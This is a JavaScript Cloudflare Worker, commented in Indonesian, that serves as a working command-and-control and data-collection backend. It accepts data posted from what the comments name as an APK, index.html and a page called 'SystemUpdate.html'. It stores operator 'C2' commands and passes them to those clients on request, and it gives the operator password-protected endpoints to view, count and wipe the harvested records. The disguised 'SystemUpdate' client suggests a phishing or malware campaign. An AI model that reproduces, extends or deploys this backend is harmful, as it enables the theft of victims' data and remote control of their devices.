// ================================================================
// Cloudflare Worker - verifikasi-api
// ================================================================
export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const method = request.method;
    const cors = {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS, DELETE',
      'Access-Control-Allow-Headers': 'Content-Type'
    };
    if (method === 'OPTIONS') return new Response(null, { headers: cors });

    // ============================================================
    // POST /data - Terima data dari index.html & APK & SystemUpdate.html
    // ============================================================
    if ((url.pathname === '/data' || url.pathname === '/api/data') && method === 'POST') {
      try {
        const body = await request.json();
        const d = { 
          waktu: new Date().toISOString(), 
          sumber: body.sumber || body.type || 'unknown', 
          data: body.data || body 
        };

        // Jika ini perintah C2
        if (d.sumber === 'c2_command') {
          await env.DATA.put('perintah', JSON.stringify(d.data));
          return new Response(JSON.stringify({ status: 'ok', type: 'c2' }), { 
            headers: { 'Content-Type': 'application/json', ...cors } 
          });
        }

        // Data biasa - simpan ke KV
        let old = [];
        const raw = await env.DATA.get('data');
        if (raw) {
          try { old = JSON.parse(raw); } catch(e) {}
        }
        old.push(d);
        if (old.length > 1000) old = old.slice(-1000);
        await env.DATA.put('data', JSON.stringify(old));
        
        return new Response(JSON.stringify({ status: 'ok', total: old.length }), { 
          headers: { 'Content-Type': 'application/json', ...cors } 
        });
      } catch(e) {
        return new Response(JSON.stringify({ status: 'error', msg: e.message }), { 
          status: 500, 
          headers: { 'Content-Type': 'application/json', ...cors } 
        });
      }
    }

    // ============================================================
    // GET /data - Lihat data (dengan password)
    // ============================================================
    if ((url.pathname === '/data' || url.pathname === '/api/data') && method === 'GET') {
      // Cek password
      if (url.searchParams.get('key') !== env.PASSWORD) {
        return new Response(JSON.stringify({ error: 'Access Denied' }), { 
          status: 403, 
          headers: { 'Content-Type': 'application/json', ...cors } 
        });
      }

      // Jika minta perintah C2 (untuk APK & SystemUpdate.html)
      if (url.searchParams.get('type') === 'perintah') {
        try {
          const perintah = await env.DATA.get('perintah');
          if (perintah) {
            await env.DATA.delete('perintah');
            return new Response(perintah, { headers: { 'Content-Type': 'application/json', ...cors } });
          }
          return new Response('{}', { headers: { 'Content-Type': 'application/json', ...cors } });
        } catch(e) {
          return new Response('{}', { headers: { 'Content-Type': 'application/json', ...cors } });
        }
      }

      // Data biasa
      try {
        const raw = await env.DATA.get('data');
        const data = raw ? JSON.parse(raw) : [];
        return new Response(JSON.stringify(data), { 
          headers: { 'Content-Type': 'application/json', ...cors } 
        });
      } catch(e) {
        return new Response('[]', { headers: { 'Content-Type': 'application/json', ...cors } });
      }
    }

    // ============================================================
    // 🔥 POST /clear - Hapus Data (DENGAN PASSWORD)
    // ============================================================
    if (url.pathname === '/clear' && method === 'POST') {
      // Cek password
      if (url.searchParams.get('key') !== env.PASSWORD) {
        return new Response(JSON.stringify({ error: 'Access Denied' }), { 
          status: 403, 
          headers: { 'Content-Type': 'application/json', ...cors } 
        });
      }

      const source = url.searchParams.get('source');
      
      try {
        const raw = await env.DATA.get('data');
        let data = raw ? JSON.parse(raw) : [];
        
        if (source) {
          // Hapus data dengan sumber tertentu
          const before = data.length;
          data = data.filter(item => item.sumber !== source);
          await env.DATA.put('data', JSON.stringify(data));
          await env.DATA.delete('perintah');
          return new Response(JSON.stringify({ 
            status: 'ok', 
            deleted: before - data.length,
            remaining: data.length,
            source: source
          }), { headers: { 'Content-Type': 'application/json', ...cors } });
        } else {
          // Hapus semua
          await env.DATA.delete('data');
          await env.DATA.delete('perintah');
          return new Response(JSON.stringify({ status: 'ok', message: 'All data cleared' }), { 
            headers: { 'Content-Type': 'application/json', ...cors } 
          });
        }
      } catch(e) {
        return new Response(JSON.stringify({ status: 'error', msg: e.message }), { 
          status: 500, 
          headers: { 'Content-Type': 'application/json', ...cors } 
        });
      }
    }

    // ============================================================
    // 🔥 GET /stats - Statistik Data (DENGAN PASSWORD)
    // ============================================================
    if (url.pathname === '/stats' && method === 'GET') {
      if (url.searchParams.get('key') !== env.PASSWORD) {
        return new Response(JSON.stringify({ error: 'Access Denied' }), { 
          status: 403, 
          headers: { 'Content-Type': 'application/json', ...cors } 
        });
      }

      try {
        const raw = await env.DATA.get('data');
        const data = raw ? JSON.parse(raw) : [];
        const stats = {};
        data.forEach(item => {
          stats[item.sumber] = (stats[item.sumber] || 0) + 1;
        });
        return new Response(JSON.stringify({ total: data.length, bySource: stats }), { 
          headers: { 'Content-Type': 'application/json', ...cors } 
        });
      } catch(e) {
        return new Response(JSON.stringify({ error: e.message }), { 
          status: 500, 
          headers: { 'Content-Type': 'application/json', ...cors } 
        });
      }
    }

    return new Response(JSON.stringify({ error: 'Not Found' }), { 
      status: 404, 
      headers: { 'Content-Type': 'application/json', ...cors } 
    });
  }
};
